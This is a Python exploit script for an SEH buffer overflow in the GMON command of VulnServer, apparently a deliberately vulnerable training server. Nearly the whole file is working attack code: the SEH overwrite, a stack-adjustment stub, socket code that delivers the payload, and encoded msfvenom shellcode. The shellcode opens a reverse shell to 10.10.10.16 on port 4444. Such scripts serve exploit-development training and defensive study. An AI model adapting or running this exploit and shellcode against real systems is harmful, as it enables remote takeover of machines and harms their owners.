#!/usr/bin/env python
"""
Description: Buffer Overflow via "GMON" (SEH) in VulnServer
Author: Cody Winkler
Contact: @c2thewinkler (twitter)
Date: 1/25/2020
Tested On: Windows 7 SP1 (EN) x64 (wow64)

[+] Usage: python expoit.py <IP> <PORT> 

$ python exploit.py 127.0.0.1 9999
"""

import socket
import struct
import sys

host = sys.argv[1]
port = int(sys.argv[2])

# POP EDI/POP EBP/RETN 0x6250172B (ASCII) in essfunc.dll
# Allowed chars: \x01-\x7f\xd0\xff
# nasm > jz short 0x6
# 00000000  7404              jz 0x6

nSEH = "\x43\x4B\x74\x04"               # INC EBX | DEC EBX | JNZ SHORT 0x6
SEH = struct.pack("<I",0x6250172B)
ascii_nop = "\x43\x4B"

stackAdj = "\x54\x58"                   # PUSH ESP | POP EAX
stackAdj += "\x66\x05\x6c\x01"*4        # add ax, 0x16c    ; adjusts EAX to beginning of A's
stackAdj += "\x40"                      # inc eax
stackAdj += "\xff\xd0"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.16 LPORT=4444 -e x86/alpha_mixed BufferRegister=EAX -f python
# x86/alpha_mixed chosen with final size 702

shellcode =  b""
shellcode += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
shellcode += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
shellcode += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += b"\x79\x6c\x69\x78\x4f\x72\x43\x30\x67\x70\x45\x50\x75"
shellcode += b"\x30\x6b\x39\x58\x65\x75\x61\x6b\x70\x72\x44\x6e\x6b"
shellcode += b"\x36\x30\x50\x30\x6e\x6b\x72\x72\x46\x6c\x6c\x4b\x46"
shellcode += b"\x32\x74\x54\x4c\x4b\x51\x62\x47\x58\x76\x6f\x6e\x57"
shellcode += b"\x62\x6a\x36\x46\x44\x71\x4b\x4f\x4c\x6c\x35\x6c\x35"
shellcode += b"\x31\x33\x4c\x73\x32\x64\x6c\x65\x70\x59\x51\x38\x4f"
shellcode += b"\x74\x4d\x43\x31\x6a\x67\x68\x62\x49\x62\x52\x72\x46"
shellcode += b"\x37\x6e\x6b\x30\x52\x42\x30\x4c\x4b\x70\x4a\x75\x6c"
shellcode += b"\x6e\x6b\x72\x6c\x67\x61\x71\x68\x4d\x33\x72\x68\x35"
shellcode += b"\x51\x4b\x61\x62\x71\x4c\x4b\x53\x69\x55\x70\x65\x51"
shellcode += b"\x58\x53\x4e\x6b\x30\x49\x76\x78\x68\x63\x34\x7a\x62"
shellcode += b"\x69\x6c\x4b\x37\x44\x4c\x4b\x36\x61\x6b\x66\x74\x71"
shellcode += b"\x59\x6f\x4e\x4c\x4f\x31\x38\x4f\x34\x4d\x73\x31\x7a"
shellcode += b"\x67\x50\x38\x6b\x50\x32\x55\x69\x66\x65\x53\x53\x4d"
shellcode += b"\x6a\x58\x57\x4b\x53\x4d\x46\x44\x32\x55\x7a\x44\x53"
shellcode += b"\x68\x4e\x6b\x42\x78\x37\x54\x55\x51\x7a\x73\x52\x46"
shellcode += b"\x4e\x6b\x44\x4c\x30\x4b\x4e\x6b\x46\x38\x55\x4c\x65"
shellcode += b"\x51\x38\x53\x6c\x4b\x74\x44\x4e\x6b\x73\x31\x38\x50"
shellcode += b"\x6b\x39\x73\x74\x35\x74\x34\x64\x71\x4b\x51\x4b\x71"
shellcode += b"\x71\x46\x39\x70\x5a\x36\x31\x79\x6f\x6b\x50\x43\x6f"
shellcode += b"\x63\x6f\x61\x4a\x6e\x6b\x75\x42\x68\x6b\x6c\x4d\x73"
shellcode += b"\x6d\x31\x78\x66\x53\x74\x72\x35\x50\x43\x30\x51\x78"
shellcode += b"\x44\x37\x51\x63\x37\x42\x63\x6f\x46\x34\x45\x38\x72"
shellcode += b"\x6c\x33\x47\x75\x76\x36\x67\x79\x6f\x4b\x65\x38\x38"
shellcode += b"\x6c\x50\x43\x31\x63\x30\x55\x50\x64\x69\x39\x54\x63"
shellcode += b"\x64\x56\x30\x43\x58\x47\x59\x4f\x70\x30\x6b\x55\x50"
shellcode += b"\x39\x6f\x58\x55\x62\x70\x56\x30\x30\x50\x32\x70\x57"
shellcode += b"\x30\x76\x30\x63\x70\x76\x30\x55\x38\x7a\x4a\x76\x6f"
shellcode += b"\x39\x4f\x39\x70\x6b\x4f\x78\x55\x6a\x37\x52\x4a\x35"
shellcode += b"\x55\x33\x58\x76\x6a\x74\x4a\x44\x4a\x74\x50\x30\x68"
shellcode += b"\x53\x32\x33\x30\x36\x71\x63\x6c\x6d\x59\x48\x66\x42"
shellcode += b"\x4a\x56\x70\x52\x76\x66\x37\x45\x38\x5a\x39\x6e\x45"
shellcode += b"\x64\x34\x43\x51\x59\x6f\x4a\x75\x6b\x35\x6f\x30\x62"
shellcode += b"\x54\x64\x4c\x49\x6f\x70\x4e\x54\x48\x71\x65\x48\x6c"
shellcode += b"\x35\x38\x4c\x30\x68\x35\x6e\x42\x63\x66\x6b\x4f\x68"
shellcode += b"\x55\x63\x58\x32\x43\x52\x4d\x63\x54\x47\x70\x4b\x39"
shellcode += b"\x39\x73\x72\x77\x70\x57\x36\x37\x64\x71\x49\x66\x62"
shellcode += b"\x4a\x36\x72\x72\x79\x53\x66\x49\x72\x4b\x4d\x71\x76"
shellcode += b"\x4a\x67\x37\x34\x75\x74\x47\x4c\x43\x31\x35\x51\x4c"
shellcode += b"\x4d\x77\x34\x45\x74\x36\x70\x78\x46\x55\x50\x33\x74"
shellcode += b"\x30\x54\x70\x50\x53\x66\x56\x36\x36\x36\x71\x56\x51"
shellcode += b"\x46\x32\x6e\x50\x56\x62\x76\x30\x53\x36\x36\x70\x68"
shellcode += b"\x73\x49\x58\x4c\x45\x6f\x4f\x76\x69\x6f\x7a\x75\x4c"
shellcode += b"\x49\x4b\x50\x30\x4e\x50\x56\x63\x76\x4b\x4f\x74\x70"
shellcode += b"\x55\x38\x53\x38\x6c\x47\x67\x6d\x61\x70\x4b\x4f\x4a"
shellcode += b"\x75\x4f\x4b\x7a\x50\x6c\x75\x49\x32\x73\x66\x61\x78"
shellcode += b"\x4c\x66\x6c\x55\x6d\x6d\x4f\x6d\x79\x6f\x6a\x75\x77"
shellcode += b"\x4c\x33\x36\x73\x4c\x35\x5a\x4d\x50\x49\x6b\x39\x70"
shellcode += b"\x51\x65\x36\x65\x6d\x6b\x33\x77\x72\x33\x73\x42\x72"
shellcode += b"\x4f\x52\x4a\x77\x70\x53\x63\x39\x6f\x5a\x75\x41\x41"

payload = shellcode + "\x41"*(3515-len(shellcode))
payload += nSEH
payload += SEH
payload += ascii_nop*4
payload += stackAdj
payload += "\x44"*(3942-len(payload))

buffer = "GMON /.:/"
buffer += payload

def main():

    try:
        print "[+] Connecting to target"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(512)
        print "[+] Sent payload with length: %d" % len(buffer)
        s.send(buffer)
        s.close()

    except Exception, msg:
        print "[-] Something went wrong :("
        print Exception, msg

main()